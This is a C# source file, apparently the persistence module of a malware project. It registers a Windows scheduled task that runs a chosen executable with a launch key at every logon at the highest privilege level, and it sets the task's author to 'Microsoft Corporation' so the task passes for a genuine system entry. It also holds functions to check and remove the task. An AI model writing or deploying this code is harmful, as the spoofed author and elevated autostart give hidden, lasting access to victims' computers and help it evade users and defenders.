using Microsoft.Win32.TaskScheduler;

namespace Main.Source.Functions.Persistence
{
    public class TaskScheduler
    {
        public enum TaskSchedulerStatus
        {
            FailedFindTask,
            TaskNotEnabled,
            AllowedToStart,
        }

        public static void Install(string name, string path)
        {
            using (var scheduler = new TaskService())
            {
                var task = scheduler.NewTask();

                task.Triggers.Add(new LogonTrigger());
                task.Actions.Add(new ExecAction(
                    path,
                    ConfigMisc.LAUNCH_KEY,
                    null
                ));

                task.RegistrationInfo.Author = "Microsoft Corporation";
                task.Principal.RunLevel = TaskRunLevel.Highest;
                task.Settings.Enabled = true;

                var registered = scheduler.RootFolder.RegisterTaskDefinition(
                    name,
                    task,
                    TaskCreation.CreateOrUpdate,
                    null,
                    null,
                    TaskLogonType.InteractiveToken
                );

                if (registered == null)
                {
                    Utilities.Logger.Error("TaskScheduler.Install: failed to install");
                }
            }
        }

        public static void Uninstall(string name)
        {
            using (var scheduler = new TaskService())
            {
                var task = scheduler.GetTask(name);
                if (task == null)
                {
                    Utilities.Logger.Warn($"TaskScheduler.Uninstall: failed to find task");
                    return;
                }

                try
                {
                    scheduler.RootFolder.DeleteTask(name, true);
                }
                catch
                {
                    Utilities.Logger.Warn($"TaskScheduler.Uninstall: failed to uninstall");
                }
            }
        }

        public static TaskSchedulerStatus Check(string name)
        {
            using (var scheduler = new TaskService())
            {
                var task = scheduler.GetTask(name);
                if (task == null)
                {
                    return TaskSchedulerStatus.FailedFindTask;
                }

                if (!task.Enabled)
                {
                    return TaskSchedulerStatus.TaskNotEnabled;
                }

                return TaskSchedulerStatus.AllowedToStart;
            }
        }
    }
}
